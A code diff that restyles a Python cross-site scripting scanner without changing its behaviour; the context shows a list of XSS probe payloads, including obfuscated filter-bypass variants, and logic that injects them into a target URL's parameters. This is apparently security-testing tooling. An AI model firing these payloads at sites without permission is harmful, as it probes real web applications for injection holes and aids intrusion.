@@ -25,22 +25,18 @@ MITRE ATT&CK: T1189 (Drive-by Compromise)
 """
 
 import argparse
-import sys
-import requests
-import urllib.parse
-import re
 import hashlib
-from typing import Dict, Any, Optional, List
+import re
+import sys
+import urllib.parse
+from typing import Any
+
+import requests
 from bs4 import BeautifulSoup
 
-from utils.logger import get_logger
 from utils.config import load_config
-from utils.helpers import (
-    validate_url,
-    check_authorization,
-    RateLimiter,
-    sanitize_filename
-)
+from utils.helpers import RateLimiter, check_authorization, sanitize_filename, validate_url
+from utils.logger import get_logger
 
 logger = get_logger(__name__)
 
@@ -53,31 +49,25 @@ XSS_PAYLOADS = [
     "<svg/onload=alert('XSS')>",
     "<body onload=alert('XSS')>",
     "<iframe src='javascript:alert(\"XSS\")'>",
-
     # Event handler payloads
     "<input onfocus=alert('XSS') autofocus>",
     "<select onfocus=alert('XSS') autofocus>",
     "<textarea onfocus=alert('XSS') autofocus>",
     "<keygen onfocus=alert('XSS') autofocus>",
     "<video><source onerror='alert(\"XSS\")'>",
-
     # Obfuscated payloads
     "<sCrIpT>alert('XSS')</sCrIpT>",
     "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
     "<script>alert(String.fromCharCode(88,83,83))</script>",
-
     # HTML attribute injection
-    "\" onmouseover=\"alert('XSS')\"",
+    '" onmouseover="alert(\'XSS\')"',
     "' onmouseover='alert(\"XSS\")'",
     "javascript:alert('XSS')",
-
     # SVG-based
     "<svg><script>alert('XSS')</script></svg>",
     "<svg><animate onbegin=alert('XSS')>",
-
     # Data URI
     "<object data='data:text/html,<script>alert(\"XSS\")</script>'>",
-
     # Filter bypass attempts
     "<img src=x:alert(alt) onerror=eval(src) alt=XSS>",
     "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
@@ -118,7 +108,7 @@ class XSSScanner:
     Tests for reflected, stored, and DOM-based XSS.
     """
 
-    def __init__(self, config: Optional[Dict[str, Any]] = None) -> None:
+    def __init__(self, config: dict[str, Any] | None = None) -> None:
         """
         Initialize XSS scanner.
 
@@ -130,12 +120,13 @@ class XSSScanner:
             self.config.get("rate_limit", {}).get("requests_per_second", 5)
         )
         self.session = requests.Session()
-        self.session.headers.update({
-            "User-Agent": self.config.get("http", {}).get(
-                "user_agent",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            )
-        })
+        self.session.headers.update(
+            {
+                "User-Agent": self.config.get("http", {}).get(
+                    "user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                )
+            }
+        )
         logger.info(f"Initialized {self.__class__.__name__}")
 
     def _generate_marker(self, payload: str) -> str:
@@ -156,8 +147,8 @@ class XSSScanner:
         param: str,
         payload: str,
         method: str = "GET",
-        data: Optional[Dict[str, str]] = None
-    ) -> Optional[Dict[str, Any]]:
+        data: dict[str, str] | None = None,
+    ) -> dict[str, Any] | None:
         """
         Test for reflected XSS vulnerability.
 
@@ -186,7 +177,14 @@ class XSSScanner:
                 params[param] = [marked_payload]
                 new_query = urllib.parse.urlencode(params, doseq=True)
                 test_url = urllib.parse.urlunparse(
-                    (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
+                    (
+                        parsed.scheme,
+                        parsed.netloc,
+                        parsed.path,
+                        parsed.params,
+                        new_query,
+                        parsed.fragment,
+                    )
                 )
 
                 response = self.session.get(test_url, timeout=timeout)
@@ -209,7 +207,7 @@ class XSSScanner:
                     "payload": payload,
                     "context": context,
                     "evidence": f"Payload reflected in {context} context",
-                    "confidence": self._determine_confidence(context)
+                    "confidence": self._determine_confidence(context),
                 }
 
         except Exception as e:
@@ -229,14 +227,14 @@ class XSSScanner:
             Context description (script, attribute, html, etc.)
         """
         try:
-            soup = BeautifulSoup(html, 'html.parser')
+            soup = BeautifulSoup(html, "html.parser")
 
             # Find payload in HTML
-            if f"<script" in payload.lower() and f"</script>" in payload.lower():
+            if "<script" in payload.lower() and "</script>" in payload.lower():
                 # Check if script tags are intact
-                if soup.find('script', text=re.compile(re.escape(payload), re.IGNORECASE)):
+                if soup.find("script", text=re.compile(re.escape(payload), re.IGNORECASE)):
                     return "script"
-                elif payload in html:
+                if payload in html:
                     # Script tags might be in HTML but not parsed (escaped or broken)
                     return "html"
 
@@ -267,16 +265,13 @@ class XSSScanner:
         Returns:
             Confidence level (high, medium, low)
         """
-        if context == "script":
+        if context == "script" or context.startswith("attribute"):
             return "high"
-        elif context.startswith("attribute"):
-            return "high"
-        elif context == "html":
+        if context == "html":
             return "medium"
-        else:
-            return "low"
+        return "low"
 
-    def test_dom_xss(self, url: str) -> List[Dict[str, Any]]:
+    def test_dom_xss(self, url: str) -> list[dict[str, Any]]:
         """
         Test for DOM-based XSS vulnerabilities.
 
@@ -305,18 +300,19 @@ class XSSScanner:
 
                     # Check if a DOM source is nearby
                     has_source = any(
-                        re.search(source, context, re.IGNORECASE)
-                        for source in DOM_SOURCES
+                        re.search(source, context, re.IGNORECASE) for source in DOM_SOURCES
                     )
 
                     if has_source:
-                        vulnerabilities.append({
-                            "type": "dom-based",
-                            "sink": match.group(),
-                            "context": context.replace('\n', ' ').strip(),
-                            "evidence": "DOM sink with user-controlled source detected",
-                            "confidence": "medium"
-                        })
+                        vulnerabilities.append(
+                            {
+                                "type": "dom-based",
+                                "sink": match.group(),
+                                "context": context.replace("\n", " ").strip(),
+                                "evidence": "DOM sink with user-controlled source detected",
+                                "confidence": "medium",
+                            }
+                        )
 
         except Exception as e:
             logger.debug(f"Error testing DOM XSS for {url}: {e}")
@@ -326,12 +322,12 @@ class XSSScanner:
     def scan_url(
         self,
         url: str,
-        params: Optional[List[str]] = None,
-        payloads: Optional[List[str]] = None,
+        params: list[str] | None = None,
+        payloads: list[str] | None = None,
         method: str = "GET",
-        data: Optional[Dict[str, str]] = None,
-        test_dom: bool = True
-    ) -> List[Dict[str, Any]]:
+        data: dict[str, str] | None = None,
+        test_dom: bool = True,
+    ) -> list[dict[str, Any]]:
         """
         Scan URL for XSS vulnerabilities.
 
@@ -372,13 +368,13 @@ class XSSScanner:
                     vuln = self.test_reflected_xss(url, param, payload, method, data)
                     if vuln:
                         vulnerabilities.append(vuln)
-                        print(f"    [+] Potential reflected XSS found!")
+                        print("    [+] Potential reflected XSS found!")
                         # Only report first finding per parameter
                         break
 
         # Test DOM-based XSS
         if test_dom:
-            print(f"[*] Testing for DOM-based XSS...")
+            print("[*] Testing for DOM-based XSS...")
             dom_vulns = self.test_dom_xss(url)
             if dom_vulns:
                 vulnerabilities.extend(dom_vulns)
@@ -389,12 +385,12 @@ class XSSScanner:
     def run(
         self,
         url: str,
-        params: Optional[List[str]] = None,
-        payloads: Optional[List[str]] = None,
+        params: list[str] | None = None,
+        payloads: list[str] | None = None,
         method: str = "GET",
-        data: Optional[Dict[str, str]] = None,
-        test_dom: bool = True
-    ) -> Dict[str, Any]:
+        data: dict[str, str] | None = None,
+        test_dom: bool = True,
+    ) -> dict[str, Any]:
         """
         Execute XSS scan.
 
@@ -431,7 +427,7 @@ class XSSScanner:
             "parameters_tested": params or "auto-detected",
             "payloads_tested": len(payloads) if payloads else len(XSS_PAYLOADS),
             "vulnerabilities_found": len(vulnerabilities),
-            "vulnerabilities": vulnerabilities
+            "vulnerabilities": vulnerabilities,
         }
 
         logger.info(f"Scan complete: {len(vulnerabilities)} vulnerabilities found")
@@ -439,7 +435,7 @@ class XSSScanner:
 
         return results
 
-    def _save_results(self, results: Dict[str, Any]) -> None:
+    def _save_results(self, results: dict[str, Any]) -> None:
         """
         Save scan results to output directory.
 
@@ -447,8 +443,8 @@ class XSSScanner:
             results: Results dictionary to save
         """
         import json
-        from pathlib import Path
         from datetime import datetime
+        from pathlib import Path
 
         output_dir = Path(self.config.get("output", {}).get("directory", "output"))
         output_dir.mkdir(exist_ok=True)
@@ -475,54 +471,29 @@ def main() -> int:
     """
     parser = argparse.ArgumentParser(
         description="XSS Scanner - Cross-Site Scripting Detection\n"
-                    "[!] For authorized security testing only",
-        formatter_class=argparse.RawDescriptionHelpFormatter
+        "[!] For authorized security testing only",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
     )
 
-    parser.add_argument(
-        "--url",
-        required=True,
-        help="Target URL to scan"
-    )
+    parser.add_argument("--url", required=True, help="Target URL to scan")
+
+    parser.add_argument("--param", help="Specific parameter to test")
 
     parser.add_argument(
-        "--param",
-        help="Specific parameter to test"
+        "--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)"
     )
 
-    parser.add_argument(
-        "--method",
-        default="GET",
-        choices=["GET", "POST"],
-        help="HTTP method (default: GET)"
-    )
+    parser.add_argument("--data", help="POST data in format key1=value1&key2=value2")
 
     parser.add_argument(
-        "--data",
-        help="POST data in format key1=value1&key2=value2"
+        "--payloads-file", help="File containing custom XSS payloads (one per line)"
     )
 
-    parser.add_argument(
-        "--payloads-file",
-        help="File containing custom XSS payloads (one per line)"
-    )
+    parser.add_argument("--no-dom", action="store_true", help="Skip DOM-based XSS testing")
 
-    parser.add_argument(
-        "--no-dom",
-        action="store_true",
-        help="Skip DOM-based XSS testing"
-    )
+    parser.add_argument("--config", help="Path to configuration file")
 
-    parser.add_argument(
-        "--config",
-        help="Path to configuration file"
-    )
-
-    parser.add_argument(
-        "--verbose", "-v",
-        action="store_true",
-        help="Enable verbose output"
-    )
+    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
 
     args = parser.parse_args()
 
@@ -532,6 +503,7 @@ def main() -> int:
     # Set log level
     if args.verbose:
         from utils.logger import set_log_level
+
         set_log_level(logger, "DEBUG")
 
     print("\n" + "=" * 70)
@@ -545,7 +517,7 @@ def main() -> int:
     payloads = None
     if args.payloads_file:
         try:
-            with open(args.payloads_file, "r") as f:
+            with open(args.payloads_file) as f:
                 payloads = [line.strip() for line in f if line.strip()]
             print(f"[*] Loaded {len(payloads)} custom payloads")
         except FileNotFoundError:
@@ -561,28 +533,21 @@ def main() -> int:
     params = [args.param] if args.param else None
 
     # Run scan
-    results = scanner.run(
-        args.url,
-        params,
-        payloads,
-        args.method,
-        post_data,
-        not args.no_dom
-    )
+    results = scanner.run(args.url, params, payloads, args.method, post_data, not args.no_dom)
 
     if "error" in results:
         print(f"\n[-] Error: {results['error']}")
         return 1
 
     # Print summary
-    print(f"\n[+] Scan Summary:")
+    print("\n[+] Scan Summary:")
     print(f"    URL: {results['url']}")
     print(f"    Method: {results['method']}")
     print(f"    Payloads Tested: {results['payloads_tested']}")
     print(f"    Vulnerabilities Found: {results['vulnerabilities_found']}")
 
     if results["vulnerabilities"]:
-        print(f"\n[+] Vulnerabilities:")
+        print("\n[+] Vulnerabilities:")
         for vuln in results["vulnerabilities"]:
             print(f"\n    Type: {vuln['type']}")
             if "parameter" in vuln:
@@ -593,7 +558,7 @@ def main() -> int:
             print(f"    Evidence: {vuln['evidence']}")
             print(f"    Confidence: {vuln['confidence']}")
     else:
-        print(f"\n[+] No XSS vulnerabilities detected")
+        print("\n[+] No XSS vulnerabilities detected")
 
     return 0
 
